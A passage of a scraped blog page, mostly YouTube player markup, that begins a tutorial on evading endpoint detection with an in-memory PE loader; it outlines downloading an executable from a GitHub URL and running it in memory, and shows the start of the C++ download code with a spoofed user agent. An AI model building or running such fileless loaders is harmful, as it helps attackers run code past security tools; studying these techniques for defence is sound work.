class="ytp-overflow-panel-content"><div class="ytp-overflow-panel-action-buttons"></div></div><button class="ytp-overflow-panel-close ytp-button" data-tooltip-title="Close" title="" aria-label="Close"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"></path></svg></button></div><div class="ytp-info-panel-detail-skrim" data-layer="5" style="display: none;"><div class="ytp-info-panel-detail" role="dialog" id="ytp-id-31"><div class="ytp-info-panel-detail-header"><div class="ytp-info-panel-detail-title"></div><button class="ytp-info-panel-detail-close ytp-button" aria-label="Close"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"></path></svg></button></div><div class="ytp-info-panel-detail-body"></div><div class="ytp-info-panel-detail-items"></div></div></div><div class="ytp-popup ytp-settings-menu" data-layer="6" id="ytp-id-17" style="display: none;"><div class="ytp-focus-trap-before" tabindex="0"></div><div class="ytp-popup-content"><div class="ytp-panel"><div class="ytp-panel-menu" role="menu"></div></div></div><div class="ytp-focus-trap-after" tabindex="0"></div></div><a class="ytp-impression-link" aria-label="Watch on YouTube" target="_blank" href="https://www.youtube.com/watch?v=fYhWRyyGO5s&amp;embeds_referring_euri=https%3A%2F%2Fg3tsyst3m.com%2F" data-layer="8"><div class="ytp-impression-link-content" aria-hidden="true"><div class="ytp-impression-link-text">Watch on</div><div class="ytp-impression-link-logo"><svg height="100%" version="1.1" viewBox="0 0 110 26" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-33"></use><path class="ytp-svg-fill" d="M 16.68,.99 C 13.55,1.03 7.02,1.16 4.99,1.68 c -1.49,.4 -2.59,1.6 -2.99,3 -0.69,2.7 -0.68,8.31 -0.68,8.31 0,0 -0.01,5.61 .68,8.31 .39,1.5 1.59,2.6 2.99,3 2.69,.7 13.40,.68 13.40,.68 0,0 10.70,.01 13.40,-0.68 1.5,-0.4 2.59,-1.6 2.99,-3 .69,-2.7 .68,-8.31 .68,-8.31 0,0 .11,-5.61 -0.68,-8.31 -0.4,-1.5 -1.59,-2.6 -2.99,-3 C 29.11,.98 18.40,.99 18.40,.99 c 0,0 -0.67,-0.01 -1.71,0 z m 72.21,.90 0,21.28 2.78,0 .31,-1.37 .09,0 c .3,.5 .71,.88 1.21,1.18 .5,.3 1.08,.40 1.68,.40 1.1,0 1.99,-0.49 2.49,-1.59 .5,-1.1 .81,-2.70 .81,-4.90 l 0,-2.40 c 0,-1.6 -0.11,-2.90 -0.31,-3.90 -0.2,-0.89 -0.5,-1.59 -1,-2.09 -0.5,-0.4 -1.10,-0.59 -1.90,-0.59 -0.59,0 -1.18,.19 -1.68,.49 -0.49,.3 -1.01,.80 -1.21,1.40 l 0,-7.90 -3.28,0 z m -49.99,.78 3.90,13.90 .18,6.71 3.31,0 0,-6.71 3.87,-13.90 -3.37,0 -1.40,6.31 c -0.4,1.89 -0.71,3.19 -0.81,3.99 l -0.09,0 c -0.2,-1.1 -0.51,-2.4 -0.81,-3.99 l -1.37,-6.31 -3.40,0 z m 29.59,0 0,2.71 3.40,0 0,17.90 3.28,0 0,-17.90 3.40,0 c 0,0 .00,-2.71 -0.09,-2.71 l -9.99,0 z m -53.49,5.12 8.90,5.18 -8.90,5.09 0,-10.28 z m 89.40,.09 c -1.7,0 -2.89,.59 -3.59,1.59 -0.69,.99 -0.99,2.60 -0.99,4.90 l 0,2.59 c 0,2.2 .30,3.90 .99,4.90 .7,1.1 1.8,1.59 3.5,1.59 1.4,0 2.38,-0.3 3.18,-1 .7,-0.7 1.09,-1.69 1.09,-3.09 l 0,-0.5 -2.90,-0.21 c 0,1 -0.08,1.6 -0.28,2 -0.1,.4 -0.5,.62 -1,.62 -0.3,0 -0.61,-0.11 -0.81,-0.31 -0.2,-0.3 -0.30,-0.59 -0.40,-1.09 -0.1,-0.5 -0.09,-1.21 -0.09,-2.21 l 0,-0.78 5.71,-0.09 0,-2.62 c 0,-1.6 -0.10,-2.78 -0.40,-3.68 -0.2,-0.89 -0.71,-1.59 -1.31,-1.99 -0.7,-0.4 -1.48,-0.59 -2.68,-0.59 z m -50.49,.09 c -1.09,0 -2.01,.18 -2.71,.68 -0.7,.4 -1.2,1.12 -1.49,2.12 -0.3,1 -0.5,2.27 -0.5,3.87 l 0,2.21 c 0,1.5 .10,2.78 .40,3.78 .2,.9 .70,1.62 1.40,2.12 .69,.5 1.71,.68 2.81,.78 1.19,0 2.08,-0.28 2.78,-0.68 .69,-0.4 1.09,-1.09 1.49,-2.09 .39,-1 .49,-2.30 .49,-3.90 l 0,-2.21 c 0,-1.6 -0.2,-2.87 -0.49,-3.87 -0.3,-0.89 -0.8,-1.62 -1.49,-2.12 -0.7,-0.5 -1.58,-0.68 -2.68,-0.68 z m 12.18,.09 0,11.90 c -0.1,.3 -0.29,.48 -0.59,.68 -0.2,.2 -0.51,.31 -0.81,.31 -0.3,0 -0.58,-0.10 -0.68,-0.40 -0.1,-0.3 -0.18,-0.70 -0.18,-1.40 l 0,-10.99 -3.40,0 0,11.21 c 0,1.4 .18,2.39 .68,3.09 .49,.7 1.21,1 2.21,1 1.4,0 2.48,-0.69 3.18,-2.09 l .09,0 .31,1.78 2.59,0 0,-14.99 c 0,0 -3.40,.00 -3.40,-0.09 z m 17.31,0 0,11.90 c -0.1,.3 -0.29,.48 -0.59,.68 -0.2,.2 -0.51,.31 -0.81,.31 -0.3,0 -0.58,-0.10 -0.68,-0.40 -0.1,-0.3 -0.21,-0.70 -0.21,-1.40 l 0,-10.99 -3.40,0 0,11.21 c 0,1.4 .21,2.39 .71,3.09 .5,.7 1.18,1 2.18,1 1.39,0 2.51,-0.69 3.21,-2.09 l .09,0 .28,1.78 2.62,0 0,-14.99 c 0,0 -3.40,.00 -3.40,-0.09 z m 20.90,2.09 c .4,0 .58,.11 .78,.31 .2,.3 .30,.59 .40,1.09 .1,.5 .09,1.21 .09,2.21 l 0,1.09 -2.5,0 0,-1.09 c 0,-1 -0.00,-1.71 .09,-2.21 0,-0.4 .11,-0.8 .31,-1 .2,-0.3 .51,-0.40 .81,-0.40 z m -50.49,.12 c .5,0 .8,.18 1,.68 .19,.5 .28,1.30 .28,2.40 l 0,4.68 c 0,1.1 -0.08,1.90 -0.28,2.40 -0.2,.5 -0.5,.68 -1,.68 -0.5,0 -0.79,-0.18 -0.99,-0.68 -0.2,-0.5 -0.31,-1.30 -0.31,-2.40 l 0,-4.68 c 0,-1.1 .11,-1.90 .31,-2.40 .2,-0.5 .49,-0.68 .99,-0.68 z m 39.68,.09 c .3,0 .61,.10 .81,.40 .2,.3 .27,.67 .37,1.37 .1,.6 .12,1.51 .12,2.71 l .09,1.90 c 0,1.1 .00,1.99 -0.09,2.59 -0.1,.6 -0.19,1.08 -0.49,1.28 -0.2,.3 -0.50,.40 -0.90,.40 -0.3,0 -0.51,-0.08 -0.81,-0.18 -0.2,-0.1 -0.39,-0.29 -0.59,-0.59 l 0,-8.5 c .1,-0.4 .29,-0.7 .59,-1 .3,-0.3 .60,-0.40 .90,-0.40 z" id="ytp-id-33"></path></svg></div></div></a><div class="ytp-gradient-bottom" data-layer="9" style="height: 505px; background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAH5CAYAAABAo1RJAAAAT0lEQVR4AeyUMQ4AIAgDEf//Z6WTIbAxOJxDo5bp0uJ2TyerMywM3BcdNKARrVA1kpCNgWwAcQCigglJSLKqrOqCquEBZ4foJknP6u+/kQMAAP//TaBNLwAAAAZJREFUAwBIaASfqtrK9QAAAABJRU5ErkJggg==&quot;); display: none;"></div><div class="ytp-chrome-bottom" data-layer="9" style="display: none; width: 1864px; left: 12px;"><div class="ytp-progress-bar-container"><div class="ytp-heat-map-container"><div class="ytp-heat-map-edu"></div></div><div class="ytp-progress-bar" tabindex="0" role="slider" aria-label="Seek slider" draggable="true" aria-valuemin="0" aria-valuemax="0" aria-valuenow="0" aria-valuetext="0 Minutes 0 Seconds of 0 Minutes 0 Seconds" style="touch-action: none;"><div class="ytp-chapters-container"><div class="ytp-chapter-hover-container" style="width: 1864px;"><div class="ytp-progress-bar-padding"></div><div class="ytp-progress-list"><div class="ytp-play-progress ytp-swatch-background-color" style="left: 0px; transform: scaleX(0); background-size: 0px; background-position-x: 0px;"></div><div class="ytp-progress-linear-live-buffer"></div><div class="ytp-load-progress" style="left: 0px; transform: scaleX(0);"></div><div class="ytp-hover-progress"></div><div class="ytp-ad-progress-list"></div></div></div></div><div class="ytp-timed-markers-container"></div><div class="ytp-clip-start-exclude" style="width: 0%;"></div><div class="ytp-clip-end-exclude" style="left: 100%; width: 0%;"></div><div class="ytp-scrubber-container" style="transform: translateX(0px);"><div class="ytp-scrubber-button ytp-swatch-background-color"><div class="ytp-scrubber-pull-indicator"></div><img class="ytp-decorated-scrubber-button"></div></div></div><div class="ytp-fine-scrubbing-container"><div class="ytp-fine-scrubbing-edu"></div><div class="ytp-fine-scrubbing"><div class="ytp-fine-scrubbing-draggable" draggable="true" style="touch-action: none; padding: 0px;"><div class="ytp-fine-scrubbing-thumbnails" tabindex="0" role="slider" type="range" aria-label="Click or scroll the panel for the precise seeking." aria-valuemin="0" aria-valuemax="22" aria-valuenow="0" aria-valuetext="Seek to 0 Minutes 0 Seconds" style="position: relative;"></div></div><div class="ytp-fine-scrubbing-cursor" aria-hidden="true"></div><div class="ytp-fine-scrubbing-seek-time" aria-hidden="true">0:00</div><div class="ytp-fine-scrubbing-play" title="Play from this position" role="button"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-5"></use><path class="ytp-svg-fill" d="M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z" id="ytp-id-5"></path></svg></div><div class="ytp-fine-scrubbing-dismiss" title="Exit precise seeking" role="button"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"></path></svg></div></div></div><div class="ytp-bound-time-left"></div><div class="ytp-bound-time-right"></div><div class="ytp-clip-start" draggable="true" title="Watch full video" style="touch-action: none; left: 0%;"><svg height="100%" version="1.1" viewBox="0 0 14 14" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-3"></use><path d="M12,14 L9,11 L9,3 L12,0 L5,0 L5,14 L12,14 Z" fill="#eaeaea" id="ytp-id-3"></path></svg></div><div class="ytp-clip-end" draggable="true" title="Watch full video" style="touch-action: none; left: 100%;"><svg height="100%" version="1.1" viewBox="0 0 14 14" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-4"></use><path d="M2,14 L5,11 L5,3 L2,0 L9,0 L9,14 L2,14 L2,14 Z" fill="#eaeaea" id="ytp-id-4"></path></svg></div></div><div class="ytp-chrome-controls"><div class="ytp-left-controls"><a class="ytp-prev-button ytp-button" role="button" tabindex="0" aria-disabled="true" style="display: none;"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-10"></use><path class="ytp-svg-fill" d="m 12,12 h 2 v 12 h -2 z m 3.5,6 8.5,6 V 12 z" id="ytp-id-10"></path></svg></a><button class="ytp-play-button ytp-button" title="" aria-keyshortcuts="k" data-title-no-tooltip="Play" data-tooltip-title="Play (k)" aria-label="Play (k)"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-11"></use><path class="ytp-svg-fill" d="M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z" id="ytp-id-11"></path></svg></button><a class="ytp-next-button ytp-button ytp-playlist-ui" role="button" tabindex="0" aria-disabled="true" style="display: none;"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-12"></use><path class="ytp-svg-fill" d="M 12,24 20.5,18 12,12 V 24 z M 22,12 v 12 h 2 V 12 h -2 z" id="ytp-id-12"></path></svg></a><span class="ytp-volume-area"><button class="ytp-mute-button ytp-button" aria-keyshortcuts="m" title="" data-tooltip-offset-y="0" data-tooltip-title="Mute (m)" aria-label="Mute (m)" data-title-no-tooltip="Mute"><div class="ytp-volume-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-14"></use><use class="ytp-svg-shadow" xlink:href="#ytp-id-15"></use><defs><clipPath id="ytp-svg-volume-animation-mask"><path d="m 14.35,-0.14 -5.86,5.86 20.73,20.78 5.86,-5.91 z"></path><path d="M 7.07,6.87 -1.11,15.33 19.61,36.11 27.80,27.60 z"></path><path class="ytp-svg-volume-animation-mover" d="M 9.09,5.20 6.47,7.88 26.82,28.77 29.66,25.99 z" transform="translate(0, 0)"></path></clipPath><clipPath id="ytp-svg-volume-animation-slash-mask"><path class="ytp-svg-volume-animation-mover" d="m -11.45,-15.55 -4.44,4.51 20.45,20.94 4.55,-4.66 z" transform="translate(0, 0)"></path></clipPath></defs><path class="ytp-svg-fill ytp-svg-volume-animation-speaker" clip-path="url(#ytp-svg-volume-animation-mask)" d="M8,21 L12,21 L17,26 L17,10 L12,15 L8,15 L8,21 Z M19,14 L19,22 C20.48,21.32 21.5,19.77 21.5,18 C21.5,16.26 20.48,14.74 19,14 ZM19,11.29 C21.89,12.15 24,14.83 24,18 C24,21.17 21.89,23.85 19,24.71 L19,26.77 C23.01,25.86 26,22.28 26,18 C26,13.72 23.01,10.14 19,9.23 L19,11.29 Z" fill="#fff" id="ytp-id-14"></path><path class="ytp-svg-fill ytp-svg-volume-animation-hider" clip-path="url(#ytp-svg-volume-animation-slash-mask)" d="M 9.25,9 7.98,10.27 24.71,27 l 1.27,-1.27 Z" fill="#fff" id="ytp-id-15" style="display: none;"></path></svg></div></button><div class="ytp-volume-panel" title="" data-tooltip-title="Volume" role="slider" aria-valuemin="0" aria-valuemax="100" tabindex="0" aria-valuenow="100" aria-valuetext="100% volume" aria-label="Volume"><div class="ytp-volume-slider" draggable="true" style="touch-action: none;"><div class="ytp-volume-slider-handle" style="left: 40px;"></div></div></div></span><div class="ytp-time-display notranslate"><div class="ytp-time-wrapper"><div class="ytp-time-contents" aria-label="0 Minutes 0 Seconds of 0 Minutes 22 Seconds"><span class="ytp-time-clip-icon" aria-label="Clip"></span><span class="ytp-time-current">0:00</span><span class="ytp-time-separator"> / </span><span class="ytp-time-duration">0:22</span></div></div><span class="ytp-clip-watch-full-video-button-separator">•</span><span class="ytp-clip-watch-full-video-button"></span><button class="ytp-live-badge ytp-button">Live</button></div><div class="ytp-chapter-container" style="display: none;"><button class="ytp-chapter-title ytp-button ytp-chapter-container-disabled" disabled=""><span class="ytp-chapter-title-prefix" aria-hidden="true">•</span><div class="ytp-chapter-title-content" aria-live="polite" title="" data-tooltip-title="View chapter"></div><div class="ytp-chapter-title-chevron"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M9.71 18.71l-1.42-1.42 5.3-5.29-5.3-5.29 1.42-1.42 6.7 6.71z" fill="#fff"></path></svg></div></button></div></div><div class="ytp-right-controls"><button class="ytp-subtitles-button ytp-button" aria-keyshortcuts="c" data-priority="5" title="" data-tooltip-title="Subtitles/closed captions unavailable" data-title-no-tooltip="Subtitles/closed captions unavailable" aria-pressed="false" aria-label="Subtitles/closed captions unavailable"><svg class="ytp-subtitles-button-icon" height="100%" version="1.1" viewBox="0 0 36 36" width="100%" fill-opacity="0.3"><use class="ytp-svg-shadow" xlink:href="#ytp-id-16"></use><path d="M11,11 C9.89,11 9,11.9 9,13 L9,23 C9,24.1 9.89,25 11,25 L25,25 C26.1,25 27,24.1 27,23 L27,13 C27,11.9 26.1,11 25,11 L11,11 Z M17,17 L15.5,17 L15.5,16.5 L13.5,16.5 L13.5,19.5 L15.5,19.5 L15.5,19 L17,19 L17,20 C17,20.55 16.55,21 16,21 L13,21 C12.45,21 12,20.55 12,20 L12,16 C12,15.45 12.45,15 13,15 L16,15 C16.55,15 17,15.45 17,16 L17,17 L17,17 Z M24,17 L22.5,17 L22.5,16.5 L20.5,16.5 L20.5,19.5 L22.5,19.5 L22.5,19 L24,19 L24,20 C24,20.55 23.55,21 23,21 L20,21 C19.45,21 19,20.55 19,20 L19,16 C19,15.45 19.45,15 20,15 L23,15 C23.55,15 24,15.45 24,16 L24,17 L24,17 Z" fill="#fff" id="ytp-id-16"></path></svg></button><button class="ytp-button ytp-settings-button" aria-expanded="false" aria-haspopup="true" aria-controls="ytp-id-17" title="" data-tooltip-title="Settings" data-tooltip-target-id="ytp-settings-button" aria-label="Settings"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-18"></use><path d="m 23.94,18.78 c .03,-0.25 .05,-0.51 .05,-0.78 0,-0.27 -0.02,-0.52 -0.05,-0.78 l 1.68,-1.32 c .15,-0.12 .19,-0.33 .09,-0.51 l -1.6,-2.76 c -0.09,-0.17 -0.31,-0.24 -0.48,-0.17 l -1.99,.8 c -0.41,-0.32 -0.86,-0.58 -1.35,-0.78 l -0.30,-2.12 c -0.02,-0.19 -0.19,-0.33 -0.39,-0.33 l -3.2,0 c -0.2,0 -0.36,.14 -0.39,.33 l -0.30,2.12 c -0.48,.2 -0.93,.47 -1.35,.78 l -1.99,-0.8 c -0.18,-0.07 -0.39,0 -0.48,.17 l -1.6,2.76 c -0.10,.17 -0.05,.39 .09,.51 l 1.68,1.32 c -0.03,.25 -0.05,.52 -0.05,.78 0,.26 .02,.52 .05,.78 l -1.68,1.32 c -0.15,.12 -0.19,.33 -0.09,.51 l 1.6,2.76 c .09,.17 .31,.24 .48,.17 l 1.99,-0.8 c .41,.32 .86,.58 1.35,.78 l .30,2.12 c .02,.19 .19,.33 .39,.33 l 3.2,0 c .2,0 .36,-0.14 .39,-0.33 l .30,-2.12 c .48,-0.2 .93,-0.47 1.35,-0.78 l 1.99,.8 c .18,.07 .39,0 .48,-0.17 l 1.6,-2.76 c .09,-0.17 .05,-0.39 -0.09,-0.51 l -1.68,-1.32 0,0 z m -5.94,2.01 c -1.54,0 -2.8,-1.25 -2.8,-2.8 0,-1.54 1.25,-2.8 2.8,-2.8 1.54,0 2.8,1.25 2.8,2.8 0,1.54 -1.25,2.8 -2.8,2.8 l 0,0 z" fill="#fff" id="ytp-id-18"></path></svg></button><a class="ytp-youtube-button ytp-button yt-uix-sessionlink" title="" target="_blank" data-priority="6" data-sessionlink="feature=player-button" href="https://www.youtube.com/watch?v=fYhWRyyGO5s" data-tooltip-title="Watch on YouTube" aria-label="Watch on YouTube"><svg height="100%" version="1.1" viewBox="0 0 67 36" width="100%" aria-hidden="true"><use class="ytp-svg-shadow" xlink:href="#ytp-id-20"></use><path class="ytp-svg-fill" d="M 45.09 10 L 45.09 25.82 L 47.16 25.82 L 47.41 24.76 L 47.47 24.76 C 47.66 25.14 47.94 25.44 48.33 25.66 C 48.72 25.88 49.16 25.99 49.63 25.99 C 50.48 25.99 51.1 25.60 51.5 24.82 C 51.9 24.04 52.09 22.82 52.09 21.16 L 52.09 19.40 C 52.12 18.13 52.05 17.15 51.90 16.44 C 51.75 15.74 51.50 15.23 51.16 14.91 C 50.82 14.59 50.34 14.44 49.75 14.44 C 49.29 14.44 48.87 14.57 48.47 14.83 C 48.27 14.96 48.09 15.11 47.93 15.29 C 47.78 15.46 47.64 15.65 47.53 15.86 L 47.51 15.86 L 47.51 10 L 45.09 10 z M 8.10 10.56 L 10.96 20.86 L 10.96 25.82 L 13.42 25.82 L 13.42 20.86 L 16.32 10.56 L 13.83 10.56 L 12.78 15.25 C 12.49 16.62 12.31 17.59 12.23 18.17 L 12.16 18.17 C 12.04 17.35 11.84 16.38 11.59 15.23 L 10.59 10.56 L 8.10 10.56 z M 30.10 10.56 L 30.10 12.58 L 32.59 12.58 L 32.59 25.82 L 35.06 25.82 L 35.06 12.58 L 37.55 12.58 L 37.55 10.56 L 30.10 10.56 z M 19.21 14.46 C 18.37 14.46 17.69 14.63 17.17 14.96 C 16.65 15.29 16.27 15.82 16.03 16.55 C 15.79 17.28 15.67 18.23 15.67 19.43 L 15.67 21.06 C 15.67 22.24 15.79 23.19 16 23.91 C 16.21 24.62 16.57 25.15 17.07 25.49 C 17.58 25.83 18.27 26 19.15 26 C 20.02 26 20.69 25.83 21.19 25.5 C 21.69 25.17 22.06 24.63 22.28 23.91 C 22.51 23.19 22.63 22.25 22.63 21.06 L 22.63 19.43 C 22.63 18.23 22.50 17.28 22.27 16.56 C 22.04 15.84 21.68 15.31 21.18 14.97 C 20.68 14.63 20.03 14.46 19.21 14.46 z M 56.64 14.47 C 55.39 14.47 54.51 14.84 53.99 15.61 C 53.48 16.38 53.22 17.60 53.22 19.27 L 53.22 21.23 C 53.22 22.85 53.47 24.05 53.97 24.83 C 54.34 25.40 54.92 25.77 55.71 25.91 C 55.97 25.96 56.26 25.99 56.57 25.99 C 57.60 25.99 58.40 25.74 58.96 25.23 C 59.53 24.72 59.81 23.94 59.81 22.91 C 59.81 22.74 59.79 22.61 59.78 22.51 L 57.63 22.39 C 57.62 23.06 57.54 23.54 57.40 23.83 C 57.26 24.12 57.01 24.27 56.63 24.27 C 56.35 24.27 56.13 24.18 56.00 24.02 C 55.87 23.86 55.79 23.61 55.75 23.25 C 55.71 22.89 55.68 22.36 55.68 21.64 L 55.68 21.08 L 59.86 21.08 L 59.86 19.16 C 59.86 17.99 59.77 17.08 59.58 16.41 C 59.39 15.75 59.07 15.25 58.61 14.93 C 58.15 14.62 57.50 14.47 56.64 14.47 z M 23.92 14.67 L 23.92 23.00 C 23.92 24.03 24.11 24.79 24.46 25.27 C 24.82 25.76 25.35 26.00 26.09 26.00 C 27.16 26.00 27.97 25.49 28.5 24.46 L 28.55 24.46 L 28.76 25.82 L 30.73 25.82 L 30.73 14.67 L 28.23 14.67 L 28.23 23.52 C 28.13 23.73 27.97 23.90 27.77 24.03 C 27.57 24.16 27.37 24.24 27.15 24.24 C 26.89 24.24 26.70 24.12 26.59 23.91 C 26.48 23.70 26.43 23.35 26.43 22.85 L 26.43 14.67 L 23.92 14.67 z M 36.80 14.67 L 36.80 23.00 C 36.80 24.03 36.98 24.79 37.33 25.27 C 37.60 25.64 37.97 25.87 38.45 25.96 C 38.61 25.99 38.78 26.00 38.97 26.00 C 40.04 26.00 40.83 25.49 41.36 24.46 L 41.41 24.46 L 41.64 25.82 L 43.59 25.82 L 43.59 14.67 L 41.09 14.67 L 41.09 23.52 C 40.99 23.73 40.85 23.90 40.65 24.03 C 40.45 24.16 40.23 24.24 40.01 24.24 C 39.75 24.24 39.58 24.12 39.47 23.91 C 39.36 23.70 39.31 23.35 39.31 22.85 L 39.31 14.67 L 36.80 14.67 z M 56.61 16.15 C 56.88 16.15 57.08 16.23 57.21 16.38 C 57.33 16.53 57.42 16.79 57.47 17.16 C 57.52 17.53 57.53 18.06 57.53 18.78 L 57.53 19.58 L 55.69 19.58 L 55.69 18.78 C 55.69 18.05 55.71 17.52 55.75 17.16 C 55.79 16.81 55.87 16.55 56.00 16.39 C 56.13 16.23 56.32 16.15 56.61 16.15 z M 19.15 16.19 C 19.50 16.19 19.75 16.38 19.89 16.75 C 20.03 17.12 20.09 17.7 20.09 18.5 L 20.09 21.97 C 20.09 22.79 20.03 23.39 19.89 23.75 C 19.75 24.11 19.51 24.29 19.15 24.30 C 18.80 24.30 18.54 24.11 18.41 23.75 C 18.28 23.39 18.22 22.79 18.22 21.97 L 18.22 18.5 C 18.22 17.7 18.28 17.12 18.42 16.75 C 18.56 16.38 18.81 16.19 19.15 16.19 z M 48.63 16.22 C 48.88 16.22 49.08 16.31 49.22 16.51 C 49.36 16.71 49.45 17.05 49.50 17.52 C 49.55 17.99 49.58 18.68 49.58 19.55 L 49.58 21 L 49.59 21 C 49.59 21.81 49.57 22.45 49.5 22.91 C 49.43 23.37 49.32 23.70 49.16 23.89 C 49.00 24.08 48.78 24.17 48.51 24.17 C 48.30 24.17 48.11 24.12 47.94 24.02 C 47.76 23.92 47.62 23.78 47.51 23.58 L 47.51 17.25 C 47.59 16.95 47.75 16.70 47.96 16.50 C 48.17 16.31 48.39 16.22 48.63 16.22 z " id="ytp-id-20"></path></svg></a><button class="ytp-pip-button ytp-button" title="" data-priority="8" data-tooltip-target-id="ytp-pip-button" data-tooltip-title="Picture-in-picture" data-title-no-tooltip="Picture-in-picture" style="display: none;"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-32"></use><path d="M25,17 L17,17 L17,23 L25,23 L25,17 L25,17 Z M29,25 L29,10.98 C29,9.88 28.1,9 27,9 L9,9 C7.9,9 7,9.88 7,10.98 L7,25 C7,26.1 7.9,27 9,27 L27,27 C28.1,27 29,26.1 29,25 L29,25 Z M27,25.02 L9,25.02 L9,10.97 L27,10.97 L27,25.02 L27,25.02 Z" fill="#fff" id="ytp-id-32"></path></svg></button><button class="ytp-size-button ytp-button" title="" aria-keyshortcuts="t" data-priority="9" style="display: none;"></button><button class="ytp-remote-button ytp-button" title="" data-tooltip-title="Play on TV" aria-haspopup="true" data-priority="10" aria-label="Play on TV" style="display: none;"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-21"></use><path d="M27,9 L9,9 C7.9,9 7,9.9 7,11 L7,14 L9,14 L9,11 L27,11 L27,25 L20,25 L20,27 L27,27 C28.1,27 29,26.1 29,25 L29,11 C29,9.9 28.1,9 27,9 L27,9 Z M7,24 L7,27 L10,27 C10,25.34 8.66,24 7,24 L7,24 Z M7,20 L7,22 C9.76,22 12,24.24 12,27 L14,27 C14,23.13 10.87,20 7,20 L7,20 Z M7,16 L7,18 C11.97,18 16,22.03 16,27 L18,27 C18,20.92 13.07,16 7,16 L7,16 Z" fill="#fff" id="ytp-id-21"></path></svg></button><button class="ytp-fullscreen-button ytp-button" title="" aria-keyshortcuts="f" data-priority="12" data-title-no-tooltip="Full screen" data-tooltip-title="Full screen (f)" aria-label="Full screen (f)"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><g class="ytp-fullscreen-button-corner-0"><use class="ytp-svg-shadow" xlink:href="#ytp-id-6"></use><path class="ytp-svg-fill" d="m 10,16 2,0 0,-4 4,0 0,-2 L 10,10 l 0,6 0,0 z" id="ytp-id-6"></path></g><g class="ytp-fullscreen-button-corner-1"><use class="ytp-svg-shadow" xlink:href="#ytp-id-7"></use><path class="ytp-svg-fill" d="m 20,10 0,2 4,0 0,4 2,0 L 26,10 l -6,0 0,0 z" id="ytp-id-7"></path></g><g class="ytp-fullscreen-button-corner-2"><use class="ytp-svg-shadow" xlink:href="#ytp-id-8"></use><path class="ytp-svg-fill" d="m 24,24 -4,0 0,2 L 26,26 l 0,-6 -2,0 0,4 0,0 z" id="ytp-id-8"></path></g><g class="ytp-fullscreen-button-corner-3"><use class="ytp-svg-shadow" xlink:href="#ytp-id-9"></use><path class="ytp-svg-fill" d="M 12,20 10,20 10,26 l 6,0 0,-2 -4,0 0,-4 0,0 z" id="ytp-id-9"></path></g></svg></button></div></div></div></div></div></div>
+
+<p><strong>Here’s what’s happening at a high level overview:</strong></p>
+
+<ul>
+  <li>The code we will be writing is an in-memory PE loader that downloads a 64-bit executable from a github URL</li>
+  <li>We map it into memory within our existing process</li>
+  <li>We resolve its dependencies</li>
+  <li>Apply relocations</li>
+  <li>Set memory protections</li>
+  <li>Execute it!</li>
+</ul>
+
+<p>Next, I’ll walk you through the code and the thought process behind it.</p>
+
+<h2 id="downloading-the-pe"><strong><em>Downloading the PE</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#downloading-the-pe" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">LoadPEInMemory</span><span class="p">(){</span>
+    <span class="c1">// Step 1: Load PE from disk (we don't use this, but I left it so you can see how this would work if we didn't use an in-memory PE loader and loaded the PE from disk instead :) )</span>
+   <span class="cm">/*
+    HANDLE hFile = CreateFileA(pePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cerr &lt;&lt; "[!] Cannot open PE file\n";
+        return false;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    std::vector&lt;BYTE&gt; fileBuffer(fileSize);
+    DWORD bytesRead = 0;
+    ReadFile(hFile, fileBuffer.data(), fileSize, &amp;bytesRead, NULL);
+    CloseHandle(hFile);
+    */</span>
+
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">agent</span> <span class="o">=</span> <span class="s">"Mozilla/5.0"</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/putty.exe"</span><span class="p">;</span>
+
+    <span class="c1">// ---- Open Internet session ----</span>
